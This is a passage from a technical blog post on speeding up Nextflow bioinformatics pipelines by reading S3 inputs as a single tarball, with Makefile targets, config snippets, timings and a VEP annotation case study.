<li class="">nextflow_tar.config: The config that run with the local file later</li>
</ul>
<p>These are the standard setup so I will not explain too much detail here, check at the below structure</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── benchmark_computing_resource.nf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── benchmark_input.nf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── inputs</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── 1_samplesheet.csv</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   └── full_samplsheet.csv</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── LICENSE</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── Makefile</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── modules</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── count_files.nf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── count_files_tar.nf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── fastp.nf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── fastqc.nf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   └── vep.nf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── nextflow.config</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── nextflow_s3.config</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── nextflow_tar.config</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── pixi.lock</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── pixi.toml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── README.md</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="testing">Testing<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#testing" class="hash-link" aria-label="Direct link to Testing" title="Direct link to Testing" translate="no">​</a></h3>
<p>Using <code>Makefile</code> to simplify the process, it will run with different configuration. For proof of concepts, run once</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">test-input-standard: </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> standard nextflow run benchmark_input.nf </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> nextflow_s3.config </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--benchmark_input</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--inputs</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"s3://io-benchmark/tarball"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">test-input-tar: </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> standard nextflow run benchmark_input.nf </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> nextflow_s3.config </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--benchmark_input_tar</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--inputs</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"s3://io-benchmark/tmp.txt"</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="running-with-10k-files-as-input">Running with 10k files as input<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#running-with-10k-files-as-input" class="hash-link" aria-label="Direct link to Running with 10k files as input" title="Direct link to Running with 10k files as input" translate="no">​</a></h4>
<p>Run the command below</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> test-input-standard</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 42,34s user 7,04s system 77% cpu 1:03,97 total</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="running-with-1-large-file-untar-in-the-process">Running with 1 large file, untar in the process<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#running-with-1-large-file-untar-in-the-process" class="hash-link" aria-label="Direct link to Running with 1 large file, untar in the process" title="Direct link to Running with 1 large file, untar in the process" translate="no">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> test-input-tar</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 11,80s user 3,42s system 66% cpu 22,965 total</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="magic-improvement">Magic improvement<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#magic-improvement" class="hash-link" aria-label="Direct link to Magic improvement" title="Direct link to Magic improvement" translate="no">​</a></h3>
<p>Although we have show that we can use the single large tar file as input and download inside. However, we have to change the module. Is there any
configuration can help ? Linking with previous section on using pipe after downloading, we can use this config</p>
<p>What it does it that it will use the same module while the files can be ingested using <code>beforeScript</code></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process{</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withName:COUNT_FILES{</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        beforeScript = "mkdir -p tarball &amp;&amp; aws s3 cp s3://io-benchmark/tarball.tar - --endpoint-url http://localhost:9000 | tar -xvf - -C tarball"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    }</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>The command to run workflow, we can use a file to keep a place holder for nextflow to accept the input and also we add the config <code>nextflow_tar.config</code></p>
<div class="language-Makefile language-makefile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-makefile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">test-input-tar-pipe: ${HOME}/.pixi/bin/pixi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	${HOME}/.pixi/bin/pixi run -e standard nextflow run benchmark_input.nf \</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		-c nextflow_s3.config -c nextflow_tar.config \</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		--benchmark_input \</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		--inputs="s3://io-benchmark/tmp.txt"</span><br></span></code></pre></div></div>
<p>Remember to create the temp file and upload to the bucket</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> tmp.txt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> tmp.txt  s3://io-benchmark --endpoint-url http://localhost:9000 </span><br></span></code></pre></div></div>
<p>Running the new setup</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> test-input-tar-pipe</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 11,33s user 2,85s system 82% cpu 17,166 total</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="recap-1">Recap<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#recap-1" class="hash-link" aria-label="Direct link to Recap" title="Direct link to Recap" translate="no">​</a></h3>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ul>
<li class="">Using tar file and nextflow config can help reduce x3 times for downloading multiple small files as input</li>
<li class="">We do not need to modify the existing module</li>
</ul></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="genomics-england-case-study">Genomics England case study<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#genomics-england-case-study" class="hash-link" aria-label="Direct link to Genomics England case study" title="Direct link to Genomics England case study" translate="no">​</a></h2>
<p>Reference: <strong><a href="https://aws.amazon.com/blogs/hpc/optimize-nextflow-workflows-on-aws-batch-with-mountpoint-for-amazon-s3/" target="_blank" rel="noopener noreferrer" class="">https://aws.amazon.com/blogs/hpc/optimize-nextflow-workflows-on-aws-batch-with-mountpoint-for-amazon-s3/</a></strong>.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="issues">Issues<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#issues" class="hash-link" aria-label="Direct link to Issues" title="Direct link to Issues" translate="no">​</a></h3>
<p>Now we can consider on what can be the issue that we can face with in the real problem. And how can we apply this
Here, I found that the blog that how Genomic England can solve the similar issue when they want to use VEP to annotate their variants.
The database that they used has many small files with 500GB in total. It will take more time to download data while takes a few minutes to annotate.</p>
<p>The pseudo code</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process VEP </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">vcf</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">vep_cache</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    vep </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--input_file</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$vcf</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--fasta</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$params</span><span class="token plain">.human_reference_fasta </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--dir_cache</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$vep_cache</span><span class="token plain"> </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="workflow-and-modules">Workflow and modules<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#workflow-and-modules" class="hash-link" aria-label="Direct link to Workflow and modules" title="Direct link to Workflow and modules" translate="no">​</a></h3>
<p>Worflow is written simply to use only VEP module. Here to quickly reproduce, all parameters are hard coded</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">include </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> ENSEMBLVEP_VEP </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> from </span><span class="token string" style="color:hsl(119, 34%, 47%)">'./modules/vep.nf'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">workflow </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    main:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        ENSEMBLVEP_VEP</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            Channel.of</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">tuple</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">id: </span><span class="token string" style="color:hsl(119, 34%, 47%)">'HCC1395N'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain">, file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"inputs/vep_test_data.vcf.gz"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"inputs/vep_test_data.vcf.gz.tbi"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">))</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, // tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">vcf</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">custom_extra_files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            Channel.value</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"GRCh38"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, // val genome</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            Channel.value</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"homo_sapiens"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, // val species</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            Channel.value</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">114</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, // val cache_version</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            Channel.fromPath</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"s3://io-benchmark/vep_cache"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, // path cache</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            Channel.of</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">tuple</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain">, </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">))</span><span class="token plain">, // tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fasta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            Channel.of</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> // path extra_files</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<p>VEP module is collected from <a href="https://github.com/nf-core/sarek/blob/20f41d1ce8b7ba296ee22adc71fe2da2ebcae93f/modules/nf-core/ensemblvep/vep/main.nf" target="_blank" rel="noopener noreferrer" class=""><strong>nf-core</strong></a></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process ENSEMBLVEP_VEP </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tag </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${meta.id}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    label </span><span class="token string" style="color:hsl(119, 34%, 47%)">'process_medium'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    conda </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${moduleDir}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/environment.yml"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    container </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${workflow.containerEngine == 'singularity' &amp;&amp; </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">task.ext.singularity_pull_docker_container</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string variable" style="color:hsl(221, 87%, 60%)">        ? 'https</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">community-cr-prod.seqera.io</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">docker</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">registry</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">v2</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">blobs</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">sha256</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">4b</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">4b5a8c173dc9beaa93effec76b99687fc926b1bd7be47df5d6ce19d7d6b4d6b7</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">data'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string variable" style="color:hsl(221, 87%, 60%)">        </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> 'community.wave.seqera.io</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">library</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">ensembl-vep</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">:</span><span 